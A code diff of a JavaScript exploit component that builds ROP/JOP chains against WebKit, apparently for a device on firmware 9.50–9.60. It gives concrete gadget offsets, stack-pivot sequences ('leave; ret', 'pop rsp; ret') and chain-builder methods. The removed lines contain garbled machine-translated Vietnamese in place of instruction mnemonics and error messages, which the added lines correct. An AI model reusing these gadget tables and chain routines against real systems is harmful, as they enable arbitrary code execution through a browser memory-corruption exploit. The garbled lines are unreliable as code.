@@ -75,7 +75,7 @@ call qword ptr [rax + 0xb8]
 // extra objects between the return address and the rbp that will be pushed by
 // jop2 later. So we pop the return address pushed by ta_jop1.
 //
-// This will make pivoting back easy, just "rời khỏi; về lại".
+// This will make pivoting back easy, just "leave; ret".
 const ta_jop2 = `
 pop rsi
 cmc
@@ -103,37 +103,37 @@ const jop4 = `
 push rdx
 jmp qword ptr [rax]
 `;
-const jop5 = 'pop rsp; về lại';
+const jop5 = 'pop rsp; ret';
 
 const webkit_gadget_offsets = new Map(Object.entries({
-    "pop rax; Phải": 0x0000000000011c46, // `58 c3`
-    "bật rbx; về lại": 0x0000000000013730, // `5b c3`
-    "bật RCx; về lại": 0x0000000000035a1e, // `59 c3`
-    "bật rdx; về lại": 0x000000000018de52, // `5a c3`
+    "pop rax; ret": 0x0000000000011c46, // `58 c3`
+    "pop rbx; ret": 0x0000000000013730, // `5b c3`
+    "pop rcx; ret": 0x0000000000035a1e, // `59 c3`
+    "pop rdx; ret": 0x000000000018de52, // `5a c3`
 
-    "bật rbp; về lại": 0x00000000000000b6, // `5d c3`
-    "pop rsi; về lại": 0x0000000000092a8c, // `5e c3`
-    "pop rdi; Phải": 0x000000000005d19d, // `5f c3`
-    "pop rsp; về lại": 0x00000000000253e0, // `5c c3`
+    "pop rbp; ret": 0x00000000000000b6, // `5d c3`
+    "pop rsi; ret": 0x0000000000092a8c, // `5e c3`
+    "pop rdi; ret": 0x000000000005d19d, // `5f c3`
+    "pop rsp; ret": 0x00000000000253e0, // `5c c3`
 
-    "bật r8; Phải": 0x000000000003fe32, // `47 58 c3`
-    "bật r9; về lại": 0x0000000000aaad51, // `47 59 c3`
+    "pop r8; ret": 0x000000000003fe32, // `47 58 c3`
+    "pop r9; ret": 0x0000000000aaad51, // `47 59 c3`
     // Not found in 9.50-9.60, but not currently used in exploit
-    // "bật r10; về lại" : 0x0000000000000000, // `4(1,3,5,7,9,b,d,f) 5a c3`
-    "bật r11; Phải": 0x0000000001833a21, // `47 5b c3`
+    // "pop r10; ret" : 0x0000000000000000, // `4(1,3,5,7,9,b,d,f) 5a c3`
+    "pop r11; ret": 0x0000000001833a21, // `47 5b c3`
 
-    "bật r12; về lại": 0x0000000000420ad1, // `47 5c c3`
-    "bật r13; Phải": 0x00000000018fc4c1, // `47 5d c3`
-    "bật r14; về lại": 0x000000000028c900, // `41 5e c3`
-    "bật r15; Phải": 0x0000000001437c8a, // `47 5f c3`
+    "pop r12; ret": 0x0000000000420ad1, // `47 5c c3`
+    "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
+    "pop r14; ret": 0x000000000028c900, // `41 5e c3`
+    "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
 
     "ret": 0x0000000000000032, // `c3`
-    "rời khỏi; về lại": 0x0000000000056322, // `c9 c3`
+    "leave; ret": 0x0000000000056322, // `c9 c3`
 
-    "mov rax, qword ptr [rax]; về lại": 0x000000000000c671, // `48 8b 00 c3`
-    "mov qword ptr [rdi], rax; về lại": 0x0000000000010c07, // `48 89 07 c3`
-    "mov dword ptr [rdi], eax; về lại": 0x00000000000071d0, // `89 07 c3`
-    "mov dword ptr [rax], esi; về lại": 0x000000000007ebd8, // `89 30 c3`
+    "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
+    "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
+    "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
+    "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
 
     [jop2]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
     [jop3]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
@@ -214,12 +214,12 @@ class Chain950Base extends ChainBase {
 
     // sequence to pivot back and return
     push_end() {
-        this.push_gadget("rời khỏi; về lại");
+        this.push_gadget("leave; ret");
     }
 
     check_is_branching() {
         if (this.is_branch_ctx) {
-            throw Error('chuỗi vẫn đang phân nhánh, hãy kết thúc nó trước khi chạy');
+            throw Error('chain is still branching, end it before running');
         }
     }
 
@@ -248,37 +248,37 @@ class Chain950Base extends ChainBase {
     }
 
     push_get_retval() {
-        this.push_gadget('pop rdi; Phải');
+        this.push_gadget('pop rdi; ret');
         this.push_value(this.retval_addr);
-        this.push_gadget('mov qword ptr [rdi], rax; về lại');
+        this.push_gadget('mov qword ptr [rdi], rax; ret');
     }
 
     push_clear_errno() {
         this.push_call(this.get_gadget('__error'));
-        this.push_gadget('pop rsi; về lại');
+        this.push_gadget('pop rsi; ret');
         this.push_value(0);
-        this.push_gadget('mov dword ptr [rax], esi; về lại');
+        this.push_gadget('mov dword ptr [rax], esi; ret');
     }
 
     push_get_errno() {
-        this.push_gadget('pop rdi; Phải');
+        this.push_gadget('pop rdi; ret');
         this.push_value(this.errno_addr);
 
         this.push_call(this.get_gadget('__error'));
 
-        this.push_gadget('mov rax, qword ptr [rax]; về lại');
-        this.push_gadget('mov dword ptr [rdi], eax; về lại');
+        this.push_gadget('mov rax, qword ptr [rax]; ret');
+        this.push_gadget('mov dword ptr [rdi], eax; ret');
     }
 
     check_stale() {
         if (this.is_stale) {
-            throw Error('chuỗi đã chạy rồi, hãy làm sạch nó trước');
+            throw Error('chain already ran, clean it first');
         }
         this.is_stale = true;
     }
     check_is_empty() {
         if (this.position === 0) {
-            throw Error('chuỗi trống');
+            throw Error('chain is empty');
         }
     }
 }
